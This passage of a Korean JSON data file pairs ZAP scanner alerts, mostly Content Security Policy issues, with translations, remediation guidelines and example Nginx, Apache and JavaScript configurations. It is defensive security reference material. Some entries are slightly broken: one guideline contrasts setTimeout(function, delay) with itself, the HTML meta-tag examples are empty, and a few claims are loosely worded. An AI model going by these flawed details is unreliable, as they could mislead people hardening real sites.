req.query.name;\n//     // CRLF 문자 제거\n//     const safeInput = userInput.replace(/\\\\r|\\\\n/g, '');\n//     res.cookie('username', safeInput); // 안전하게 필터링된 값 사용\n//     res.send('Cookie set.');\n// });"
  },
  "CSP": {
    "translated": "CSP (콘텐츠 보안 정책) – 웹 페이지의 콘텐츠 보안 정책 설정 상태",
    "description": "Content Security Policy (CSP)는 웹 페이지에 로드될 수 있는 리소스(스크립트, 스타일시트, 이미지 등)의 출처를 웹 서버가 지정하여 XSS (Cross-Site Scripting) 및 기타 콘텐츠 주입 공격을 방지하는 보안 메커니즘입니다. ZAP에서 'CSP' 경고가 발생했다면, CSP 헤더가 존재하지만 추가적인 검토가 필요하거나, 정책이 너무 느슨하거나, 특정 지시어에 문제가 있을 수 있음을 의미할 수 있습니다.",
    "solution_guidelines": [
      "**CSP 헤더 설정:** `Content-Security-Policy` HTTP 응답 헤더를 사용하여 정책을 정의합니다. `X-Content-Security-Policy` 및 `X-WebKit-CSP`는 과거 브라우저를 위한 헤더이므로 최신 브라우저에서는 `Content-Security-Policy`만 사용합니다.",
      "**엄격한 정책 적용:** 가능한 한 엄격한 정책을 적용합니다. 예를 들어, `'self'` (동일 출처) 및 신뢰할 수 있는 특정 도메인만 허용하고, 인라인 스크립트나 `eval()` 사용을 금지합니다.",
      "**`script-src` 지시어:** 인라인 스크립트(in-line scripts)와 `eval()` 사용은 XSS에 매우 취약하므로, `script-src 'unsafe-inline'` 및 `'unsafe-eval'` 사용을 피하고, 대신 외부 파일로 스크립트를 분리하거나, CSP nonce 또는 hash를 사용합니다.",
      "**`object-src` 지시어:** 플러그인 기반의 콘텐츠(Flash, Java Applets 등) 로드를 제한하기 위해 `object-src 'none'` 또는 `'self'`를 설정합니다.",
      "**`default-src` 지시어:** 다른 지시어에 대한 기본 폴백(fallback)으로 작동하므로, 엄격하게 설정하는 것이 좋습니다. (예: `default-src 'self'`)",
      "**`report-uri` 또는 `report-to` 사용:** CSP 위반 발생 시 보고서를 수신할 URI를 지정하여 정책을 모니터링하고 개선하는 데 활용합니다.",
      "**정책의 지속적인 개선:** CSP를 점진적으로 강화하고, 애플리케이션의 모든 기능을 테스트하여 정책이 의도치 않게 기능을 방해하지 않도록 합니다."
    ],
    "example_csp_header": "# Nginx 설정 예시\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self'; img-src 'self' data:; font-src 'self'; object-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'self';\";\n\n# Apache 설정 예시\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self'; img-src 'self' data:; font-src 'self'; object-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'self';\"\n\n# HTML meta 태그 예시 (HTTP 헤더가 더 강력하고 선호됨)\n"
  },
  "CSP: Failure to Define Directive with No Fallback": {
    "translated": "CSP: 기본 보안 지시자 미정의 – CSP 정책에 필수적인 보안 지시자가 빠져있음",
    "description": "CSP (Content Security Policy)에서 `default-src` 지시어가 정의되지 않았거나, `default-src`가 적용되지 않는 특정 리소스 유형에 대한 지시어(예: `script-src`, `style-src`)가 정의되지 않아 해당 리소스에 대한 폴백이 없는 상황입니다. 이는 특정 종류의 콘텐츠 주입 공격에 취약해질 수 있습니다.",
    "solution_guidelines": [
      "**`default-src` 지시어 정의:** 가장 기본적인 해결책은 `default-src` 지시어를 정의하는 것입니다. 이는 다른 특정 지시어가 정의되지 않았을 때 기본 폴백으로 작용합니다.",
      "**모든 필요한 지시어 명시적 정의:** `script-src`, `style-src`, `img-src`, `connect-src`, `font-src`, `object-src`, `media-src`, `frame-src`, `frame-ancestors`, `form-action` 등 애플리케이션에서 사용되는 모든 리소스 유형에 대해 필요한 지시어를 명시적으로 정의합니다. `default-src`가 정의되어 있더라도, 특정 리소스 유형에 대해 더 엄격하거나 다른 출처를 허용해야 할 경우 해당 지시어를 별도로 정의해야 합니다.",
      "**`object-src 'none'` 권장:** 플러그인(Flash, Java Applets) 기반의 공격을 방지하기 위해 `object-src 'none'`을 설정하는 것을 강력히 권장합니다.",
      "**`base-uri 'self'` 권장:** `<base>` 태그 주입을 통한 상대 경로 스크립트 로드 등을 방지하기 위해 `base-uri 'self'`를 설정합니다.",
      "**`form-action 'self'` 권장:** CSRF와 같은 폼 관련 공격을 완화하기 위해 `form-action 'self'`를 설정합니다."
    ],
    "example_csp_complete": "# Nginx / Apache: Content-Security-Policy 헤더 (예시)\nadd_header Content-Security-Policy \"\n    default-src 'self';\n    script-src 'self' https://cdnjs.cloudflare.com;\n    style-src 'self' 'unsafe-inline'; # 인라인 스타일이 필요한 경우에만, 가능하면 피할 것\n    img-src 'self' data: https://cdn.example.com;\n    connect-src 'self' wss://example.com;\n    font-src 'self';\n    object-src 'none'; # 플러그인 사용 안 함\n    media-src 'self';\n    frame-src 'self'; # iframe 내 콘텐츠 로드\n    frame-ancestors 'self'; # 현재 페이지를 프레임으로 포함할 수 있는 출처\n    form-action 'self'; # form 제출 대상 URL\n    base-uri 'self'; # <base> 태그의 URL\n    report-uri /csp-report; # 위반 보고서 전송 URL\n\";"
  },
  "CSP: Header & Meta": {
    "translated": "CSP: 헤더 및 메타 태그 중복 설정 – CSP 정책이 HTTP 헤더와 HTML 메타 태그 모두에 설정됨",
    "description": "CSP(Content Security Policy)가 HTTP 응답 헤더와 HTML `<meta>` 태그 모두에서 정의된 경우를 나타냅니다. 이는 기술적으로는 가능하지만, HTTP 헤더의 CSP가 `<meta>` 태그의 CSP보다 우선순위가 높고 더 많은 지시어를 지원하기 때문에 혼동을 주거나 의도치 않은 정책 적용으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**HTTP 응답 헤더 방식 선호:** CSP를 정의할 때는 HTTP 응답 헤더(`Content-Security-Policy`)를 사용하는 것을 강력히 권장합니다. HTTP 헤더 방식은 더 많은 지시어를 지원하고, 페이지가 로드되기 전에 정책이 적용되므로 더 강력한 보안을 제공합니다.",
      "**`<meta>` 태그 방식은 제한적:** `<meta>` 태그를 통한 CSP는 일부 지시어(예: `frame-ancestors`, `report-uri`)를 지원하지 않으며, 페이지가 파싱된 후에 적용되므로 초기 XSS 공격에 취약할 수 있습니다. 가능한 경우 `<meta>` 태그 방식은 피합니다.",
      "**한 가지 방식만 사용:** 혼동을 피하고 일관된 정책 적용을 위해 HTTP 응답 헤더 또는 `<meta>` 태그 중 한 가지 방식만 사용하여 CSP를 정의합니다.",
      "**정책 일관성 유지:** 만약 두 가지 방식 모두 불가피하게 사용해야 한다면, 두 정책이 서로 충돌하지 않고 보안 목표를 일관되게 달성하도록 주의 깊게 정의하고 테스트합니다."
    ],
    "example_preferred_method": "# HTTP 응답 헤더만 사용 (권장)\n# Nginx 설정 예시:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\";\n\n# Apache 설정 예시:\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\"\n\n# HTML <meta> 태그는 삭제하거나 사용하지 않습니다."
  },
  "CSP: Malformed Policy (Non-ASCII)": {
    "translated": "CSP: 잘못된 정책 (비 ASCII 문자) – CSP 정책에 비표준 문자가 포함되어 오류를 유발할 수 있음",
    "description": "CSP (Content Security Policy) 헤더에 유효하지 않은 문자, 특히 Non-ASCII 문자(비-아스키 문자)가 포함되어 정책이 제대로 파싱되지 않거나 적용되지 않는 취약점입니다. 이는 CSP의 보안 효용성을 저하시킬 수 있습니다.",
    "solution_guidelines": [
      "**CSP 정책에 ASCII 문자만 사용:** CSP 정책 문자열은 오직 ASCII 문자만으로 구성되어야 합니다. 정책을 작성할 때 특수 문자나 비-ASCII 문자가 포함되지 않도록 주의합니다.",
      "**인코딩 확인:** CSP 헤더를 생성하는 서버 측 코드나 웹 서버 설정에서 문자열 인코딩이 올바르게 처리되는지 확인합니다. UTF-8 BOM(Byte Order Mark)이 포함되지 않도록 주의합니다.",
      "**정책 유효성 검사 도구 사용:** CSP 정책을 배포하기 전에 온라인 CSP 유효성 검사 도구(예: CSP Evaluator by Google)를 사용하여 문법적 오류나 잘못된 문자 사용 여부를 확인합니다.",
      "**오류 로깅 확인:** 브라우저 개발자 도구의 콘솔이나 `report-uri` (또는 `report-to`) 지시어를 통해 수신되는 CSP 위반 보고서에서 정책 파싱 오류가 발생하는지 확인합니다."
    ],
    "example_correct_csp": "# 잘못된 CSP 예시 (Non-ASCII 문자 포함)\n# add_header Content-Security-Policy \"script-src 'self'; img-src 'self' '데이터:';\"; # '데이터:'가 문제\n\n# 올바른 CSP 예시 (모든 문자가 ASCII)\n# Nginx 설정 예시\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline';\";\n\n# Apache 설정 예시\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline';\""
  },
  "CSP: Meta Policy Invalid Directive": {
    "translated": "CSP: 메타 태그 정책 내 잘못된 지시자 – HTML 메타 태그의 CSP 정책에 유효하지 않은 지시자가 사용됨",
    "description": "HTML `<meta>` 태그를 통해 정의된 CSP (Content Security Policy)에 유효하지 않거나, `<meta>` 태그에서는 지원되지 않는 지시어가 포함된 경우 발생하는 취약점입니다. 이는 정책의 일부 또는 전체가 무시되어 보안 효용성을 저하시킬 수 있습니다.",
    "solution_guidelines": [
      "**지원되는 지시어만 사용:** `<meta>` 태그를 통해 CSP를 정의할 경우, MDN Web Docs 등에서 제공하는 `<meta>` CSP에서 지원하는 지시어 목록을 확인하고, 지원되지 않는 지시어는 포함하지 않도록 합니다.",
      "**`frame-ancestors` 및 `report-uri` 사용 금지:** 특히 `frame-ancestors` 및 `report-uri` (또는 `report-to`) 지시어는 `<meta>` 태그 CSP에서 지원되지 않습니다. 이들은 반드시 HTTP 응답 헤더를 통해서만 정의해야 합니다.",
      "**HTTP 헤더 방식 선호:** 가능한 한 `<meta>` 태그 대신 HTTP 응답 헤더를 통해 CSP를 정의하는 것이 좋습니다. HTTP 헤더 방식은 더 많은 지시어를 지원하고, 페이지 로드 전에 적용되어 더 강력한 보안을 제공합니다.",
      "**CSP 유효성 검사 도구 사용:** CSP 정책을 배포하기 전에 온라인 CSP 유효성 검사 도구를 사용하여 정책의 문법과 유효성을 검사합니다."
    ],
    "example_valid_meta_csp": "# 올바른 HTML <meta> CSP 예시 (지원되는 지시어만 포함)\n# 잘못된 HTML <meta> CSP 예시 (지원되지 않는 지시어 포함)\n# HTTP 응답 헤더 사용 권장 (예: Nginx)\n# add_header Content-Security-Policy \"frame-ancestors 'self'; report-uri /csp-report; default-src 'self'; script-src 'self';\";"
  },
  "CSP: Notices": {
    "translated": "CSP: 주의사항 – CSP 설정에 보안상 주의해야 할 점이 발견됨",
    "description": "ZAP에서 'CSP: Notices'는 CSP(Content Security Policy)가 설정되어 있지만, 정책에 개선의 여지가 있거나, 특정 브라우저에서 경고가 발생할 수 있는 부분이 있음을 알리는 정보성 알림입니다. 이는 취약점이라기보다는 CSP 정책의 효율성이나 호환성을 개선하기 위한 제안일 수 있습니다.",
    "solution_guidelines": [
      "**CSP 정책 검토 및 최적화:** ZAP이 제공하는 구체적인 Notice 내용을 확인하고, 정책을 더 엄격하게 만들거나, 불필요한 예외를 제거하는 등 최적화할 부분을 찾습니다.",
      "**`unsafe-inline` 및 `unsafe-eval` 제거:** 가능한 한 `script-src 'unsafe-inline'` 및 `script-src 'unsafe-eval'` 지시어를 제거하고, 대신 nonce 또는 hash를 사용하거나 스크립트를 외부 파일로 분리합니다.",
      "**`default-src` 활용:** `default-src`를 사용하여 기본적인 정책을 설정하고, 필요한 경우에만 특정 지시어를 재정의하여 정책의 복잡성을 줄입니다.",
      "**브라우저 호환성 고려:** 모든 주요 브라우저에서 CSP가 의도한 대로 작동하는지 확인하고, 오래된 브라우저를 지원해야 하는 경우 fallback 정책을 고려합니다.",
      "**`report-uri` 또는 `report-to` 사용:** `report-uri` (또는 `report-to`) 지시어를 사용하여 CSP 위반 보고서를 수신하고, 이를 통해 정책의 문제점을 파악하고 개선합니다.",
      "**점진적 배포:** 처음에는 `Content-Security-Policy-Report-Only` 헤더를 사용하여 정책을 모니터링한 후, 충분히 검증되면 `Content-Security-Policy`로 전환하여 정책을 적용합니다."
    ],
    "example_csp_refinement": "# CSP 정책 예시 (점진적 개선 목표)\n\n# 초기 (느슨하거나 정보성 알림이 발생할 수 있는):\n# add_header Content-Security-Policy \"default-src 'self' 'unsafe-inline' 'unsafe-eval';\";\n\n# 개선된 CSP (unsafe-inline, unsafe-eval 제거 목표)\n# add_header Content-Security-Policy \"\n#     default-src 'self';\n#     script-src 'self' 'nonce-randomstring' https://cdnjs.cloudflare.com; # nonce 사용 예시\n#     style-src 'self' 'sha256-hashofinlinecss'; # hash 사용 예시\n#     img-src 'self' data:;\n#     object-src 'none';\n#     base-uri 'self';\n#     form-action 'self';\n#     frame-ancestors 'self';\n#     report-uri /csp-report;\n# \";\n\n# JavaScript에서 nonce 사용 예시:\n// const nonce = 'randomstring'; // 서버에서 동적으로 생성하여 HTML에 삽입\n// <script nonce=\"randomstring\">\n//     // 인라인 스크립트\n// </script>"
  },
  "CSP: Wildcard Directive": {
    "translated": "CSP: 와일드카드 지시자 사용 – CSP 정책에 '모두 허용' 와일드카드가 사용되어 보안이 약해짐",
    "description": "CSP (Content Security Policy) 지시어에 와일드카드(`*`)가 사용되어 특정 종류의 리소스 로드를 너무 광범위하게 허용하는 경우입니다. 이는 CSP의 주요 목적인 XSS 및 기타 콘텐츠 주입 공격 방어의 효과를 크게 감소시킬 수 있습니다.",
    "solution_guidelines": [
      "**와일드카드(`*`) 사용 금지:** `script-src '*'`, `style-src '*'`, `connect-src '*'`, `default-src '*'`와 같이 와일드카드를 사용하여 모든 출처를 허용하는 것을 피합니다.",
      "**명시적 출처 지정:** 필요한 경우에만 특정 도메인(예: `https://cdnjs.cloudflare.com`, `https://fonts.googleapis.com`)을 명시적으로 지정하여 리소스 로드를 허용합니다.",
      "**`'self'` 사용:** 동일 출처의 리소스만 허용해야 할 경우 `'self'` 키워드를 사용합니다.",
      "**`data:` URI 사용 주의:** `img-src data:`와 같이 `data:` URI를 허용하는 것은 XSS 공격에 사용될 수 있으므로, 꼭 필요한 경우에만 허용하고 가능한 한 제한합니다.",
      "**정책의 점진적 강화:** 처음에는 `report-only` 모드로 시작하여 와일드카드를 포함한 정책을 모니터링하고, 위반 보고서를 분석하여 필요한 최소한의 출처만 허용하도록 정책을 점진적으로 강화합니다.",
      "**`unsafe-inline` 및 `unsafe-eval` 제거:** 와일드카드와 마찬가지로 `unsafe-inline` 및 `unsafe-eval`은 CSP의 보안성을 저하시키므로 제거해야 합니다."
    ],
    "example_avoid_wildcard_csp": "# 잘못된 CSP 예시 (와일드카드 사용)\n# add_header Content-Security-Policy \"script-src *; style-src *;\";\n# add_header Content-Security-Policy \"default-src *;\";\n\n# 올바른 CSP 예시 (특정 출처 또는 'self' 사용)\n# Nginx 설정 예시\nadd_header Content-Security-Policy \"\n    default-src 'self';\n    script-src 'self' https://cdn.example.com https://ajax.googleapis.com;\n    style-src 'self' 'unsafe-inline'; # 불가피한 경우에만\n    img-src 'self' data:;\n    connect-src 'self' wss://api.example.com;\n    object-src 'none';\n    form-action 'self';\n\";\n\n# Apache 설정 예시\nHeader always set Content-Security-Policy \"\n    default-src 'self';\n    script-src 'self' https://cdn.example.com https://ajax.googleapis.com;\n    style-src 'self' 'unsafe-inline';\n    img-src 'self' data:;\n    connect-src 'self' wss://api.example.com;\n    object-src 'none';\n    form-action 'self';\n\";"
  },
  "CSP: X-Content-Security-Policy": {
    "translated": "CSP: 비표준 X-Content-Security-Policy 헤더 – CSP 정책이 비표준 헤더를 통해 정의됨",
    "description": "`X-Content-Security-Policy` 헤더는 CSP(Content Security Policy)의 초기 비표준 버전입니다. 현재는 `Content-Security-Policy` 헤더가 표준이며, `X-Content-Security-Policy`는 구형 브라우저와의 호환성을 위해 사용될 수 있지만, 최신 브라우저에서는 무시되거나 완전히 지원되지 않을 수 있습니다. 표준 헤더만 사용하고 이 구형 헤더는 제거하는 것이 좋습니다.",
    "solution_guidelines": [
      "**`Content-Security-Policy` 표준 헤더만 사용:** 최신 브라우저를 지원하고 보안을 강화하기 위해 `Content-Security-Policy` HTTP 응답 헤더만 사용합니다.",
      "**`X-Content-Security-Policy` 헤더 제거:** `X-Content-Security-Policy` 및 `X-WebKit-CSP`와 같은 비표준/구형 CSP 헤더는 웹 서버 또는 애플리케이션 코드에서 제거합니다. 이는 정책의 중복 적용이나 혼동을 방지하고, 브라우저가 올바른 표준 정책을 따르도록 합니다.",
      "**브라우저 호환성 검토:** 만약 매우 오래된 브라우저를 지원해야 하는 특별한 요구사항이 있다면 예외적으로 구형 헤더를 유지할 수 있지만, 이 경우에도 표준 헤더를 우선적으로 설정해야 합니다."
    ],
    "example_header_removal": "# Nginx 설정 예시 (X-Content-Security-Policy 제거)\n# http 또는 server 블록에서 불필요한 구형 헤더를 제거하거나 추가하지 않습니다.\n# add_header X-Content-Security-Policy \"default-src 'self';\" (이 줄은 제거)\n\n# 올바른 설정: 표준 Content-Security-Policy 헤더만 사용\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\";\n\n# Apache 설정 예시 (X-Content-Security-Policy 제거)\n# Header unset X-Content-Security-Policy (이 줄은 추가하여 제거)\n\n# 올바른 설정: 표준 Content-Security-Policy 헤더만 사용\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\""
  },
  "CSP: X-WebKit-CSP": {
    "translated": "CSP: 비표준 X-WebKit-CSP 헤더 – CSP 정책이 비표준 헤더를 통해 정의됨",
    "description": "`X-WebKit-CSP` 헤더는 `Content-Security-Policy`의 또 다른 비표준/벤더 접두사 버전입니다. 이 헤더는 WebKit 기반의 구형 브라우저(예: 이전 버전의 Safari, Chrome)에서 사용되었지만, 현재는 `Content-Security-Policy`가 표준화되어 대부분의 현대 브라우저에서 이를 지원합니다. 이 구형 헤더의 사용은 불필요하며 제거하는 것이 좋습니다.",
    "solution_guidelines": [
      "**`Content-Security-Policy` 표준 헤더만 사용:** 최신 브라우저와 호환성을 위해 `Content-Security-Policy` HTTP 응답 헤더만 사용합니다.",
      "**`X-WebKit-CSP` 헤더 제거:** 웹 서버 또는 애플리케이션 코드에서 `X-WebKit-CSP` 헤더를 제거합니다. 이는 CSP 정책의 일관성과 명확성을 유지하는 데 도움이 됩니다.",
      "**일반적인 원칙:** 모든 보안 헤더는 가능한 한 표준화된 최신 버전을 사용하고, 구형/비표준 헤더는 특별한 레거시 호환성 요구사항이 없는 한 제거합니다."
    ],
    "example_header_removal": "# Nginx 설정 예시 (X-WebKit-CSP 제거)\n# http 또는 server 블록에서 불필요한 구형 헤더를 제거하거나 추가하지 않습니다.\n# add_header X-WebKit-CSP \"default-src 'self';\" (이 줄은 제거)\n\n# 올바른 설정: 표준 Content-Security-Policy 헤더만 사용\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\";\n\n# Apache 설정 예시 (X-WebKit-CSP 제거)\n# Header unset X-WebKit-CSP (이 줄은 추가하여 제거)\n\n# 올바른 설정: 표준 Content-Security-Policy 헤더만 사용\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\""
  },
  "CSP: script-src unsafe-eval": {
    "translated": "CSP: script-src unsafe-eval 허용 – JavaScript 코드 실행을 허용하여 XSS에 취약할 수 있음",
    "description": "CSP (Content Security Policy)의 `script-src` 지시어에 `'unsafe-eval'` 키워드가 포함되어 JavaScript의 `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function()` 등 문자열 기반 코드 실행 함수를 허용하는 취약점입니다. 이는 XSS (Cross-Site Scripting) 공격자가 주입한 코드가 실행될 수 있는 경로를 열어주므로 매우 위험합니다.",
    "solution_guidelines": [
      "**`'unsafe-eval'` 제거:** `script-src` 지시어에서 `'unsafe-eval'` 키워드를 즉시 제거합니다.",
      "**대안 사용:** `eval()`과 같은 함수에 의존하는 코드를 리팩토링하여 안전한 대안을 사용합니다. 예를 들어, `setTimeout(function, delay)` 대신 `setTimeout(function, delay)`를, JSON 파싱에는 `JSON.parse()`를 사용합니다.",
      "**JSON.parse() 사용:** JSON 데이터를 파싱할 때는 `eval()` 대신 `JSON.parse()`를 사용합니다. `JSON.parse()`는 JSON 표준에 엄격하게 따라야 하므로 안전합니다.",
      "**템플릿 엔진 사용:** 동적으로 HTML을 생성하는 경우, 클라이언트 측에서 문자열 연결을 통해 HTML을 생성하는 대신, Angular, React, Vue.js 등의 안전한 템플릿 엔진을 사용합니다.",
      "**CSP Strict 모드 고려:** 최신 CSP 정책에서는 `nonce`나 `hash`를 사용하여 인라인 스크립트를 허용하면서도 `unsafe-inline`이나 `unsafe-eval`을 피하는 Strict 모드를 사용할 수 있습니다."
    ],
    "example_avoid_unsafe_eval": "# 잘못된 CSP 예시 (unsafe-eval 포함)\n# add_header Content-Security-Policy \"script-src 'self' 'unsafe-eval';\";\n\n# 올바른 CSP 예시 (unsafe-eval 제거)\n# Nginx 설정 예시\nadd_header Content-Security-Policy \"\n    default-src 'self';\n    script-src 'self' https://cdnjs.cloudflare.com; # 필요한 외부 스크립트 출처\n    object-src 'none';\n    base-uri 'self';\n    form-action 'self';\n\";\n\n# JavaScript 코드 개선\n// 잘못된 예시:\n// eval(\"alert('Hello');\");\n// setTimeout(\"doSomething()\", 1000);\n// const data = '{ \"name\": \"John\" }';\n// const obj = eval('(' + data + ')');\n\n// 올바른 예시:\n// setTimeout(function() { doSomething(); }, 1000);\n// const data = '{ \"name\": \"John\" }';\n// const obj = JSON.parse(data);"
  },
  "CSP: script-src unsafe-hashes": {
    "translated": "CSP: script-src unsafe-hashes 허용 – 인라인 스크립트의 해시 검증을 허용하여 보안이 약해질 수 있음",
    "description": "CSP (Content Security Policy)의 `script-src` 지시어에 `'unsafe-hashes'` 키워드가 포함되어 특정 인라인 스크립트 해시를 허용하지만, 잠재적으로 악의적인 스크립트의 실행을 허용할 수 있는 취약점입니다. 이는 `'unsafe-inline'`보다는 낫지만, 여전히 XSS 공격에 대한 위험을 완전히 제거하지 못합니다.",
    "solution_guidelines": [
      "**`'unsafe-hashes'` 제거 시도:** 가능하다면 `script-src` 지시어에서 `'unsafe-hashes'` 키워드를 제거하고, 인라인 스크립트를 외부 파일로 분리하거나 `nonce` 기반의 CSP를 사용하는 것을 권장합니다.",
      "**Hash의 정확성 및 관리:** `unsafe-hashes`를 사용해야 하는 경우, 허용되는 스크립트의 해시가 정확하게 계산되었는지 확인하고, 스크립트 내용이 변경될 때마다 해시를 업데이트하는 자동화된 프로세스를 구축합니다.",
      "**Nonce 기반 CSP 선호:** `nonce`는 서버에서 동적으로 생성된 일회용 토큰을 사용하여 인라인 스크립트를 안전하게 허용하는 더 강력한 방법입니다. `nonce`는 매 요청마다 달라지므로 해시보다 더 유연하고 안전합니다."
    ],
    "example_nonce_preference": "# 잘못된 CSP 예시 (unsafe-hashes 포함)\n# add_header Content-Security-Policy \"script-src 'self' 'unsafe-hashes' 'sha256-hashofinlinecode';\";\n\n# 올바른 CSP 예시 (nonce 사용 선호)\n# Nginx 설정 예시\n# 서버 측에서 동적으로 nonce를 생성하고 HTML에 주입해야 합니다.\n# add_header Content-Security-Policy \"\n#     default-src 'self';\n#     script-src 'self' 'nonce-{dynamic_nonce_value}';\n#     object-src 'none';\n# \";\n\n# HTML 예시\n# 해시 사용이 불가피한 경우 (예시)\n# add_header Content-Security-Policy \"\n#     script-src 'self' 'sha256-RFNkL53/Z9r3p/Wj3s2A2d2f7g2h2i2j2k2l2m2n2o2p2q2r2s2t2u2v2w2x2y2z=';\n# \";\n# (해시 값은 실제 인라인 스크립트의 sha256 해시값이어야 합니다.)"
  },
  "CSP: script-src unsafe-inline": {
    "translated": "CSP: script-src unsafe-inline 허용 – 인라인 JavaScript 실행을 허용하여 XSS에 취약할 수 있음",
    "description": "CSP (Content Security Policy)의 `script-src` 지시어에 `'unsafe-inline'` 키워드가 포함되어 인라인 JavaScript 코드의 실행을 허용하는 취약점입니다. 이는 XSS (Cross-Site Scripting) 공격자가 주입한 스크립트가 실행될 수 있는 주요 경로 중 하나이므로 매우 위험합니다.",
    "solution_guidelines": [
      "**`'unsafe-inline'` 제거:** `script-src` 지시어에서 `'unsafe-inline'` 키워드를 즉시 제거합니다.",
      "**인라인 스크립트 외부 파일로 분리:** 모든 인라인 스크립트(HTML 태그 내 `<script>` 블록, 이벤트 핸들러 `onclick` 등)를 외부 `.js` 파일로 분리합니다. 분리된 파일은 `script-src 'self'` 또는 허용된 CDN 도메인에서 로드하도록 합니다.",
      "**Nonce 또는 Hash 사용:** 인라인 스크립트가 불가피한 경우, CSP `nonce` (Number Once) 또는 `hash`를 사용하여 특정 인라인 스크립트만 안전하게 허용합니다. `nonce`는 동적으로 생성되는 일회용 토큰이며, `hash`는 스크립트 내용의 암호화 해시 값입니다. `nonce`가 일반적으로 더 유연하고 안전한 방법으로 간주됩니다.",
      "**이벤트 핸들러 제거:** HTML 요소에 직접 명시된 이벤트 핸들러(예: `onclick`, `onmouseover`)를 제거하고, JavaScript에서 `addEventListener`를 사용하여 동적으로 이벤트 리스너를 추가합니다.",
      "**XSS 필터링 및 인코딩:** 사용자 입력을 HTML에 출력하기 전에 항상 적절히 인코딩(HTML 엔티티 인코딩)하고, XSS 필터링을 서버 측에서 구현합니다. (이는 CSP와 별개의 필수 보안 조치입니다.)"
    ],
    "example_avoid_unsafe_inline": "# 잘못된 CSP 예시 (unsafe-inline 포함)\n# add_header Content-Security-Policy \"script-src 'self' 'unsafe-inline';\";\n\n# 올바른 CSP 예시 (unsafe-inline 제거 및 nonce 사용)\n# Nginx 설정 예시 (서버에서 동적으로 nonce를 생성하여 HTML에 주입해야 함)\n# add_header Content-Security-Policy \"\n#     default-src 'self';\n#     script-src 'self' 'nonce-{dynamic_nonce_value}' https://cdnjs.cloudflare.com;\n#     object-src 'none';\n#     base-uri 'self';\n#     form-action 'self';\n# \";\n\n# HTML (nonce 값은 서버에서 동적으로 생성)\n# <script nonce=\"{dynamic_nonce_value}\">\n#     // 안전한 인라인 스크립트\n#     console.log('This script is allowed by CSP nonce.');\n# </script>\n\n# 인라인 스크립트를 외부 파일로 분리하는 예시:\n# HTML:\n# <script src=\"/static/my_script.js\"></script>\n\n# my_script.js:\n# console.log('This is an external script.');\n\n# CSS 내 inline style도 'unsafe-inline'에 포함될 수 있습니다.\n# style-src 'unsafe-inline' 역시 피하고 외부 스타일시트 사용 또는 hash/nonce 사용을 고려해야 합니다."
  },
  "CSP: style-src unsafe-hashes": {
    "translated": "CSP: style-src unsafe-hashes 허용 – 인라인 스타일의 해시 검증을 허용하여 보안이 약해질 수 있음",
    "description": "CSP (Content Security Policy)의 `style-src` 지시어에 `'unsafe-hashes'` 키워드가 포함되어 특정 인라인 스타일시트 해시를 허용하는 경우입니다. `script-src`의 `unsafe-hashes`와 유사하게, 이는 특정 스타일을 허용하지만, 잠재적으로 악의적인 스타일 주입을 통해 정보 노출(예: 필터링된 입력값을 통한 데이터 유출)이나 UI 재구성 공격에 사용될 수 있습니다.",
    "solution_guidelines": [
      "**`'unsafe-hashes'` 제거 시도:** 가능하다면 `style-src` 지시어에서 `'unsafe-hashes'` 키워드를 제거하고, 인라인 스타일을 외부 `.css` 파일로 분리하거나 `nonce` 기반의 CSP를 사용하는 것을 권장합니다.",
      "**Hash의 정확성 및 관리:** `unsafe-hashes`를 사용해야 하는 경우, 허용되는 스타일 블록의 해시가 정확하게 계산되었는지 확인하고, 스타일 내용이 변경될 때마다 해시를 업데이트하는 자동화된 프로세스를 구축합니다.",
      "**Nonce 기반 CSP 선호:** `nonce`는 서버에서 동적으로 생성된 일회용 토큰을 사용하여 인라인 스타일을 안전하게 허용하는 더 강력한 방법입니다. `nonce`는 매 요청마다 달라지므로 해시보다 더 유연하고 안전합니다.",
      "**외부 스타일시트 사용:** 모든 스타일은 외부 `.css` 파일로 분리하여 `style-src 'self'` 또는 허용된 CDN 도메인에서 로드하도록 합니다.",
      "**XSS 필터링 및 인코딩:** 사용자 입력을 HTML에 출력하기 전에 항상 적절히 인코딩하고, XSS 필터링을 서버 측에서 구현합니다. (이는 CSP와 별개의 필수 보안 조치입니다.)"
    ],
    "example_nonce_preference_style": "# 잘못된 CSP 예시 (unsafe-hashes 포함)\n# add_header Content-Security-Policy \"style-src 'self' 'unsafe-hashes' 'sha256-hashofinlinecss';\";\n\n# 올바른 CSP 예시 (nonce 사용 선호)\n# Nginx 설정 예시 (서버에서 동적으로 nonce를 생성하여 HTML에 주입해야 함)\n# add_header Content-Security-Policy \"\n#     default-src 'self';\n#     style-src 'self' 'nonce-{dynamic_nonce_value}';\n#     object-src 'none';\n# \";\n\n# HTML (nonce 값은 서버에서 동적으로 생성)\n# <style nonce=\"{dynamic_nonce_value}\">\n#     /* 안전한 인라인 스타일 */\n#     body { background-color: #f0f0f0; }\n# </style>\n\n# 외부 스타일시트 사용 예시:\n# HTML:\n# <link rel=\"stylesheet\" href=\"/static/my_styles.css\">\n\n# my_styles.css:\n# body {\n#     font-family: Arial, sans-serif;\n# }"
  },
  "CSP: style-src unsafe-inline": {
    "translated": "CSP: style-src unsafe-inline 허용 – 인라인 CSS 스타일 실행을 허용하여 보안이 약해질 수 있음",
